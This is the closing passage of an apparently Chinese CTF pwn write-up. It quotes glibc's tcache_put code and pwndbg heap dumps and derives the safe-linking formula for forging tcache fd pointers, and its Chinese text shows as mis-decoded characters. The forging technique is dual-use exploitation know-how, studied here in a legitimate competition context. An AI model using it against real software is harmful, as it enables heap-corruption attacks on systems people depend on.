</span></span><span style="display:flex;"><span>  tcache_entry <span style="color:#ff79c6">*</span>e <span style="color:#ff79c6">=</span> (tcache_entry <span style="color:#ff79c6">*</span>)chunk2mem(chunk);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* Mark this chunk as &#34;in the tcache&#34; so the test in _int_free will
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     detect a double free.  */</span>
</span></span><span style="display:flex;"><span>  e<span style="color:#ff79c6">-&gt;</span>key <span style="color:#ff79c6">=</span> tcache_key;      <span style="color:#6272a4">// ä¸€ä¸ªéšæœºæ•°ï¼Œtcache_key_initialize (void) ç”Ÿæˆ
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  e<span style="color:#ff79c6">-&gt;</span>next <span style="color:#ff79c6">=</span> PROTECT_PTR(<span style="color:#ff79c6">&amp;</span>e<span style="color:#ff79c6">-&gt;</span>next, tcache<span style="color:#ff79c6">-&gt;</span>entries[tc_idx]);
</span></span><span style="display:flex;"><span>  tcache<span style="color:#ff79c6">-&gt;</span>entries[tc_idx] <span style="color:#ff79c6">=</span> e;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">++</span>(tcache<span style="color:#ff79c6">-&gt;</span>counts[tc_idx]);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>å¯ä»¥åšä¸€ä¸ªæµ‹è¯•ï¼ŒæŸ¥çœ‹tcache çš„nextæŒ‡é’ˆã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; x/20xg 0x555555559290
</span></span><span style="display:flex;"><span>0x555555559290: 0x0000000000000000      0x0000000000000051
</span></span><span style="display:flex;"><span>0x5555555592a0: 0x0000000555555559      0xa8d3bb0dc1ab0725
</span></span><span style="display:flex;"><span>0x5555555592b0: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x5555555592c0: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x5555555592d0: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x5555555592e0: 0x0000000000000000      0x0000000000000051
</span></span><span style="display:flex;"><span>0x5555555592f0: 0x000055500000c7f9      0xa8d3bb0dc1ab0725
</span></span><span style="display:flex;"><span>0x555555559300: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x555555559310: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>0x555555559320: 0x0000000000000000      0x0000000000000000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; p/x <span style="color:#ff79c6">(</span>0x5555555592f0 &gt;&gt; 12<span style="color:#ff79c6">)</span> ^ 0x5555555592a0
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$1</span> <span style="color:#ff79c6">=</span> 0x55500000c7f9
</span></span></code></pre></div><p>å› æ­¤æˆ‘ä»¬ä¼ªé€ fdã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(addr <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>) <span style="color:#ff79c6">^</span> pos
</span></span></code></pre></div><h2 id="å‚è€ƒ">å‚è€ƒ</h2>
<ul>
<li><a href="https://kagehutatsu.com/?p=951">2023 é¹åŸæ¯ Pwn éƒ¨åˆ†Writeup</a></li>
<li><a href="https://blog.xmcve.com/2023/11/05/%E9%B9%8F%E5%9F%8E%E6%9D%AF2023-Writeup/#title-7">é¹åŸæ¯2023 Writeup</a></li>
<li><a href="https://unauth401.tech/pcb2023/#baby-heap">é¹åŸæ¯ 2023 åˆèµ› Pwn WriteUp</a></li>
<li><a href="https://mp.weixin.qq.com/s/tjz3urSdsQac30JiqVN62Q">2023ç¬¬ä¸‰å±Šâ€œé¹åŸæ¯â€çº¿ä¸Šåˆèµ›WriteUp</a></li>
<li><a href="https://www.cnblogs.com/ZIKH26/articles/16066329.html">DASCTF2022_checkin - ZikH26</a></li>
</ul>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/pwn">PWN</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        var disqus_shortname = 'ldrx30';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>

</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  Â© ldrx30 |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
